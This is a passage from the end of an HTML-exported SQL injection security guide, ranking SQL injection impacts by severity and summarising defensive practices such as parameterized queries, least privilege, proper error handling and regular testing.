style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8006-be84-ca3f289959c7" class=""><strong>Risk Prioritization</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c5-95aa-ce06c97f618e" class=""><strong>Critical (Immediate Action):</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8014-a6b4-c6e48a804ffd" class="bulleted-list"><li style="list-style-type:disc">Authentication bypass</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80dc-83dd-c6f7358d789c" class="bulleted-list"><li style="list-style-type:disc">Data extraction</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c7-a525-e45063aa9921" class="bulleted-list"><li style="list-style-type:disc">Remote code execution</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b9-8679-d2ac13430b3f" class=""><strong>High (Urgent Action):</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a4-8307-f9a80a8c5dbc" class="bulleted-list"><li style="list-style-type:disc">Data manipulation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8096-93eb-c412dc75e2c4" class="bulleted-list"><li style="list-style-type:disc">Privilege escalation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-806d-bc22-e8c56939689e" class="bulleted-list"><li style="list-style-type:disc">Second-order injection</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805b-89f5-d07c9a6c158c" class=""><strong>Medium (Planned Action):</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802b-bf20-d4c38208a152" class="bulleted-list"><li style="list-style-type:disc">Error message disclosure</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80bb-863e-cc6d40e186e9" class="bulleted-list"><li style="list-style-type:disc">Information leakage</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-808c-b800-c56d1000f309" class="bulleted-list"><li style="list-style-type:disc">Denial of service</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8048-adbd-fa76d66c438d"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8085-a2bb-e45e800a7ef3" class=""><strong>Summary</strong></h2></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-802d-9ca5-e8c52915633a" class="">SQL Injection remains one of the most critical web application vulnerabilities. Key points to remember:</p></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-805f-bde5-fddc460ebab5" class="numbered-list" start="1"><li><strong>Always use parameterized queries</strong> - Never concatenate user input</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8073-a767-e9eccfd29e2c" class="numbered-list" start="2"><li><strong>Validate all input</strong> - Whitelist approach preferred</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-80c8-a420-ce6b9ee7e913" class="numbered-list" start="3"><li><strong>Use least privilege</strong> - Database users with minimal permissions</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8001-b54a-ca1301d2d592" class="numbered-list" start="4"><li><strong>Handle errors properly</strong> - Don&#x27;t expose database details</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8007-b69f-f768e3db58f2" class="numbered-list" start="5"><li><strong>Test regularly</strong> - Code reviews, penetration testing, scanning</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8063-a158-f667634467cb" class="numbered-list" start="6"><li><strong>Implement defense in depth</strong> - Multiple layers of protection</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-80b2-aeec-feca9a4ab68d" class="numbered-list" start="7"><li><strong>Monitor for attacks</strong> - Log and alert on suspicious patterns</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8012-854a-f2f3e2b3c1b1" class="numbered-list" start="8"><li><strong>Keep systems updated</strong> - Patch databases and frameworks</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8067-950a-f072c1270f13" class="numbered-list" start="9"><li><strong>Train developers</strong> - Security awareness and secure coding</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8026-97a1-c833601da316" class="numbered-list" start="10"><li><strong>Follow security standards</strong> - OWASP guidelines and best practices</li></ol></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8027-97a0-e2ae3c5b385d" class="">Remember: <strong>SQL Injection is prevented by parameterized queries (prepared statements), not by input validation or WAFs alone!</strong></p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
